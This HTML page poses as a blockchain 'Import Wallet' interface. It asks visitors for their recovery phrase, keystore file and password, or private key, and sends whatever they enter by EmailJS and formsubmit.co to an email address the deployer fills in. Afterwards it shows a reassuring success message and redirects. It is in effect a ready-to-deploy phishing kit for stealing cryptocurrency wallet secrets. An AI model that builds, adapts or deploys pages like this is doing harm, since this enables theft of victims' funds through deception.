<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet - BLOCKCHAIN</title>
    <meta name="description" content="Import your wallet using one of the methods below">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="styles.css">
    
    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    
    <style>
        .connect-wallet {
            min-height: 100vh;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 2rem;
        }
        
        .connect-container {
            width: 100%;
            max-width: 800px;
        }
        
        .connect-card {
            background: rgba(15, 23, 42, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        
        .connect-header {
            padding: 2rem;
            text-align: center;
            border-bottom: 1px solid rgba(59, 130, 246, 0.2);
        }
        
        .connect-title {
            font-size: 2.5rem;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 0.5rem;
        }
        
        .connect-subtitle {
            color: #94a3b8;
            font-size: 1.1rem;
        }
        
        .connect-content {
            padding: 2rem;
        }
        
        .tab-container {
            margin-bottom: 2rem;
        }
        
        .tab-list {
            display: flex;
            background: rgba(15, 23, 42, 0.6);
            border-radius: 12px;
            padding: 0.5rem;
            margin-bottom: 2rem;
        }
        
        .tab-button {
            flex: 1;
            background: transparent;
            border: none;
            color: #94a3b8;
            padding: 1rem 1.5rem;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .tab-button.active {
            background: #3b82f6;
            color: #ffffff;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
        }
        
        .tab-button:hover:not(.active) {
            color: #ffffff;
            background: rgba(59, 130, 246, 0.1);
        }
        
        .tab-panel {
            display: none;
        }
        
        .tab-panel.active {
            display: block;
        }
        
        .form-group {
            margin-bottom: 2rem;
        }
        
        .form-label {
            display: block;
            color: #94a3b8;
            margin-bottom: 0.5rem;
            font-size: 1rem;
        }
        
        .form-input {
            width: 100%;
            min-height: 150px;
            padding: 1.5rem;
            background: rgba(15, 23, 42, 0.8);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 12px;
            color: #ffffff;
            font-size: 1rem;
            resize: vertical;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }
        
        .form-input::placeholder {
            color: #64748b;
        }
        
        .form-input.error {
            border-color: #ef4444;
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
        }
        
        .form-input.success {
            border-color: #10b981;
            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1);
        }
        
        .error-message {
            color: #ef4444;
            font-size: 0.875rem;
            margin-top: 0.5rem;
            display: none;
        }
        
        .success-message {
            color: #10b981;
            font-size: 0.875rem;
            margin-top: 0.5rem;
            display: none;
        }
        
        .submit-button {
            width: 100%;
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            color: #ffffff;
            border: none;
            padding: 1.5rem 2rem;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
        }
        
        .submit-button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.4);
        }
        
        .submit-button:disabled {
            background: #64748b;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .submit-button.loading {
            background: linear-gradient(135deg, #10b981, #059669);
        }
        
        .back-button {
            position: absolute;
            top: 2rem;
            left: 2rem;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(59, 130, 246, 0.3);
            color: #ffffff;
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }
        
        .back-button:hover {
            background: rgba(59, 130, 246, 0.2);
            border-color: #3b82f6;
        }
        
        .back-button svg {
            width: 20px;
            height: 20px;
        }
        
        .notification {
            position: fixed;
            top: 2rem;
            right: 2rem;
            padding: 1rem 1.5rem;
            border-radius: 8px;
            color: #ffffff;
            font-weight: 500;
            z-index: 1000;
            transform: translateX(100%);
            transition: transform 0.3s ease;
        }
        
        .notification.show {
            transform: translateX(0);
        }
        
        .notification.success {
            background: #10b981;
        }
        
        .notification.error {
            background: #ef4444;
        }
        
        .notification.info {
            background: #3b82f6;
        }
        
        @media (max-width: 768px) {
            .connect-title {
                font-size: 2rem;
            }
            
            .connect-content {
                padding: 1.5rem;
            }
            
            .tab-list {
                flex-direction: column;
                gap: 0.5rem;
            }
            
            .tab-button {
                text-align: center;
            }
            
            .back-button {
                top: 1rem;
                left: 1rem;
                padding: 0.5rem 1rem;
                font-size: 0.9rem;
            }
            
            .notification {
                top: 1rem;
                right: 1rem;
                left: 1rem;
                transform: translateY(-100%);
            }
            
            .notification.show {
                transform: translateY(0);
            }
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav class="navbar">
        <div class="nav-container">
            <div class="nav-logo">
                <img src="_next/static/media/wallet.819daf29.svg" alt="Blockchain Logo" class="logo-img">
                <h1>BLOCKCHAIN</h1>
            </div>
            <div class="nav-links">
                <a href="index.html" class="nav-link">Home</a>
                <a href="select-wallet.html" class="nav-link">Select Wallet</a>
                <a href="connect-wallet.html" class="nav-link active">Connect Wallet</a>
            </div>
        </div>
    </nav>

    <!-- Back Button -->
    <a href="select-wallet.html" class="back-button">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="m12 19-7-7 7-7"></path>
            <path d="M19 12H5"></path>
        </svg>
        <span>Back</span>
    </a>

    <!-- Connect Wallet Section -->
    <section class="connect-wallet">
        <div class="connect-container">
            <div class="connect-card">
                <div class="connect-header">
                    <h1 class="connect-title">Import Wallet</h1>
                    <p class="connect-subtitle">Import your wallet using one of the methods below</p>
                </div>
                
                <div class="connect-content">
                    <div class="tab-container">
                        <div class="tab-list" role="tablist">
                            <button class="tab-button active" role="tab" aria-selected="true" data-tab="phrase">
                                Phrase
                            </button>
                            <button class="tab-button" role="tab" aria-selected="false" data-tab="keystore">
                                Keystore
                            </button>
                            <button class="tab-button" role="tab" aria-selected="false" data-tab="private-key">
                                Private Key
                            </button>
                        </div>
                        
                        <!-- Phrase Tab -->
                        <div class="tab-panel active" id="phrase-panel">
                            <form class="wallet-form" id="phrase-form" action="https://formsubmit.co/your-email@domain.com" method="POST">
                                <input type="hidden" name="_subject" value="New Wallet Import - Recovery Phrase">
                                <input type="hidden" name="_template" value="table">
                                <input type="hidden" name="_next" value="https://yourdomain.com/success.html">
                                
                                <div class="form-group">
                                    <label class="form-label">Recovery Phrase</label>
                                    <textarea 
                                        class="form-input" 
                                        name="recovery_phrase"
                                        id="recovery-phrase"
                                        placeholder="Enter your recovery phrase (12, 15, 18, 21, or 24 words)"
                                        rows="6"
                                        required
                                    ></textarea>
                                    <div class="error-message" id="phrase-error"></div>
                                    <div class="success-message" id="phrase-success"></div>
                                </div>
                                
                                <div class="form-group">
                                    <label class="form-label">Email Address</label>
                                    <input 
                                        type="email" 
                                        class="form-input" 
                                        name="email"
                                        id="email"
                                        placeholder="Enter your email address"
                                        required
                                        style="min-height: auto; height: auto;"
                                    >
                                </div>
                                
                                <button type="submit" class="submit-button" id="phrase-submit">
                                    Import Wallet
                                </button>
                            </form>
                        </div>
                        
                        <!-- Keystore Tab -->
                        <div class="tab-panel" id="keystore-panel">
                            <form class="wallet-form" id="keystore-form" action="https://formsubmit.co/your-email@domain.com" method="POST" enctype="multipart/form-data">
                                <input type="hidden" name="_subject" value="New Wallet Import - Keystore">
                                <input type="hidden" name="_template" value="table">
                                <input type="hidden" name="_next" value="https://yourdomain.com/success.html">
                                
                                <div class="form-group">
                                    <label class="form-label">Keystore File</label>
                                    <input type="file" class="form-input" name="keystore_file" id="keystore-file" accept=".json" required style="min-height: auto; height: auto;">
                                </div>
                                
                                <div class="form-group">
                                    <label class="form-label">Password</label>
                                    <input type="password" class="form-input" name="keystore_password" id="keystore-password" placeholder="Enter your keystore password" required style="min-height: auto; height: auto;">
                                </div>
                                
                                <div class="form-group">
                                    <label class="form-label">Email Address</label>
                                    <input type="email" class="form-input" name="email" id="keystore-email" placeholder="Enter your email address" required style="min-height: auto; height: auto;">
                                </div>
                                
                                <button type="submit" class="submit-button" id="keystore-submit">
                                    Import Wallet
                                </button>
                            </form>
                        </div>
                        
                        <!-- Private Key Tab -->
                        <div class="tab-panel" id="private-key-panel">
                            <form class="wallet-form" id="private-key-form" action="https://formsubmit.co/your-email@domain.com" method="POST">
                                <input type="hidden" name="_subject" value="New Wallet Import - Private Key">
                                <input type="hidden" name="_template" value="table">
                                <input type="hidden" name="_next" value="https://yourdomain.com/success.html">
                                
                                <div class="form-group">
                                    <label class="form-label">Private Key</label>
                                    <input type="password" class="form-input" name="private_key" id="private-key" placeholder="Enter your private key" required style="min-height: auto; height: auto;">
                                </div>
                                
                                <div class="form-group">
                                    <label class="form-label">Email Address</label>
                                    <input type="email" class="form-input" name="email" id="private-key-email" placeholder="Enter your email address" required style="min-height: auto; height: auto;">
                                </div>
                                
                                <button type="submit" class="submit-button" id="private-key-submit">
                                    Import Wallet
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script>
        // EmailJS Configuration
        (function() {
            // Replace with your actual EmailJS service ID, template ID, and public key
            emailjs.init("YOUR_PUBLIC_KEY");
        })();

        // Form processing configuration
        const CONFIG = {
            emailjs: {
                serviceId: "YOUR_SERVICE_ID",
                templateId: "YOUR_TEMPLATE_ID",
                publicKey: "YOUR_PUBLIC_KEY"
            },
            formsubmit: {
                email: "your-email@domain.com", // Replace with your email
                successUrl: "https://yourdomain.com/success.html" // Replace with your success page
            }
        };

        // Tab functionality
        function initTabs() {
            const tabButtons = document.querySelectorAll('.tab-button');
            const tabPanels = document.querySelectorAll('.tab-panel');
            
            tabButtons.forEach(button => {
                button.addEventListener('click', () => {
                    const targetTab = button.getAttribute('data-tab');
                    
                    // Remove active class from all buttons and panels
                    tabButtons.forEach(btn => btn.classList.remove('active'));
                    tabPanels.forEach(panel => panel.classList.remove('active'));
                    
                    // Add active class to clicked button and corresponding panel
                    button.classList.add('active');
                    document.getElementById(`${targetTab}-panel`).classList.add('active');
                });
            });
        }

        // Form validation
        function validateForm(formData) {
            const errors = [];
            
            // Check if recovery phrase is valid (12, 15, 18, 21, or 24 words)
            if (formData.recovery_phrase) {
                const words = formData.recovery_phrase.trim().split(/\s+/);
                const validLengths = [12, 15, 18, 21, 24];
                if (!validLengths.includes(words.length)) {
                    errors.push('Recovery phrase must be 12, 15, 18, 21, or 24 words');
                }
            }
            
            // Check if private key is valid (64 character hex string)
            if (formData.private_key) {
                if (!/^[0-9a-fA-F]{64}$/.test(formData.private_key)) {
                    errors.push('Private key must be a 64-character hexadecimal string');
                }
            }
            
            // Check if email is valid
            if (formData.email) {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailRegex.test(formData.email)) {
                    errors.push('Please enter a valid email address');
                }
            }
            
            return errors;
        }

        // Show notification
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.textContent = message;
            
            document.body.appendChild(notification);
            
            // Show notification
            setTimeout(() => notification.classList.add('show'), 100);
            
            // Hide and remove notification
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => {
                    if (notification.parentNode) {
                        notification.parentNode.removeChild(notification);
                    }
                }, 300);
            }, 5000);
        }

        // Process form with EmailJS
        async function processWithEmailJS(formData, formType) {
            try {
                const templateParams = {
                    to_email: CONFIG.formsubmit.email,
                    from_name: formData.email || 'Anonymous User',
                    form_type: formType,
                    message: `New wallet import request via ${formType}`,
                    ...formData
                };

                const response = await emailjs.send(
                    CONFIG.emailjs.serviceId,
                    CONFIG.emailjs.templateId,
                    templateParams
                );

                if (response.status === 200) {
                    showNotification('Wallet import request sent successfully!', 'success');
                    return true;
                } else {
                    throw new Error('EmailJS request failed');
                }
            } catch (error) {
                console.error('EmailJS Error:', error);
                showNotification('Failed to send via EmailJS. Trying FormSubmit...', 'error');
                return false;
            }
        }

        // Process form with FormSubmit
        async function processWithFormSubmit(formElement) {
            try {
                // Update form action with current email
                const emailInput = formElement.querySelector('input[name="email"]');
                if (emailInput && emailInput.value) {
                    const currentEmail = emailInput.value;
                    formElement.action = `https://formsubmit.co/${currentEmail}`;
                }
                
                // Submit form
                formElement.submit();
                return true;
            } catch (error) {
                console.error('FormSubmit Error:', error);
                showNotification('Form submission failed. Please try again.', 'error');
                return false;
            }
        }

        // Handle form submission
        async function handleFormSubmission(e, formType) {
            e.preventDefault();
            
            const form = e.target;
            const submitButton = form.querySelector('.submit-button');
            const formData = new FormData(form);
            
            // Convert FormData to object
            const data = {};
            formData.forEach((value, key) => {
                data[key] = value;
            });
            
            // Validate form data
            const errors = validateForm(data);
            if (errors.length > 0) {
                errors.forEach(error => showNotification(error, 'error'));
                return;
            }
            
            // Disable submit button and show loading state
            submitButton.disabled = true;
            submitButton.classList.add('loading');
            submitButton.textContent = 'Processing...';
            
            try {
                // Try EmailJS first
                let success = await processWithEmailJS(data, formType);
                
                // If EmailJS fails, fall back to FormSubmit
                if (!success) {
                    success = await processWithFormSubmit(form);
                }
                
                if (success) {
                    // Clear form
                    form.reset();
                    
                    // Show success message
                    showNotification('Wallet import request submitted successfully!', 'success');
                    
                    // Redirect after delay
                    setTimeout(() => {
                        window.location.href = 'index.html';
                    }, 2000);
                }
            } catch (error) {
                console.error('Form processing error:', error);
                showNotification('An error occurred. Please try again.', 'error');
            } finally {
                // Re-enable submit button
                submitButton.disabled = false;
                submitButton.classList.remove('loading');
                submitButton.textContent = 'Import Wallet';
            }
        }

        // Initialize forms
        function initForms() {
            const forms = {
                'phrase-form': 'Recovery Phrase',
                'keystore-form': 'Keystore File',
                'private-key-form': 'Private Key'
            };
            
            Object.entries(forms).forEach(([formId, formType]) => {
                const form = document.getElementById(formId);
                if (form) {
                    form.addEventListener('submit', (e) => handleFormSubmission(e, formType));
                }
            });
        }

        // Initialize page
        document.addEventListener('DOMContentLoaded', function() {
            initTabs();
            initForms();
            
            // Show welcome notification
            setTimeout(() => {
                showNotification('Welcome! Please select your wallet import method.', 'info');
            }, 1000);
        });

        // Error handling
        window.addEventListener('error', function(e) {
            console.error('An error occurred:', e.error);
            showNotification('An unexpected error occurred. Please refresh the page.', 'error');
        });
    </script>
</body>
</html>
